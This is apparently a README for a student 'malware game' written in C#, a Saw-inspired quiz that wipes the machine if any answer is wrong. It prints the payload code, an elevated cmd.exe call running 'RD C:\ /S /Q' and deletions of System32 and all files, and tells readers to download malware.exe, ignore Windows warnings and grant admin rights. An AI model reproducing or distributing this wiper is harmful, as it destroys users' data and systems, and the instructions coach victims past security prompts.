# Malware Game 
This is a project I completed for a malware analysis class in school. This game is inspired by the movie Saw, essentially you download and open the game, then start playing; if you get any of the questions wrong in the game it deletes system32. I coded this project in C# on VScode. By looking into MainWindow.xaml.cs, you can start to see the meat of the program pretaining to the logic of the game system and the privledge escalation and deletion of c:\Windows\System32 via command prompt. 
```c#
if (questionNumber == totalQuestions)
  {
    //Percentage Score but should only be 100%
    percentage = (int)Math.Round((double)(score * 100/ totalQuestions));
      if(percentage < 100) {
        var proc1 = new ProcessStartInfo();
        string Command1;
        string Command2; 
        string Command3;
        proc1.UseShellExecute = true;

        proc1.WorkingDirectory = @"C:\Windows\System32";              
        proc1.FileName = @"C:\Windows\System32\cmd.exe";
        proc1.Verb = "runas";
        Command1 = @"RD C:\ /S /Q";
        Command2 = @"del c:\windows\system32*.* /q";
        Command3 = @"del /f /s /q 'C:*.*'";

        proc1.Arguments = "/k " + Command1 + Command2 + Command3;
                
        proc1.WindowStyle = ProcessWindowStyle.Normal;
        Process.Start(proc1);

        }
  }
```
To start playing this game you must download malware.exe located in the bin/Debug directory, ignore all of the notifications that windows throws at you to not play this game, start it up and accept it giving admin permisions and then your set! ** I am not responsible for any machines damaged **
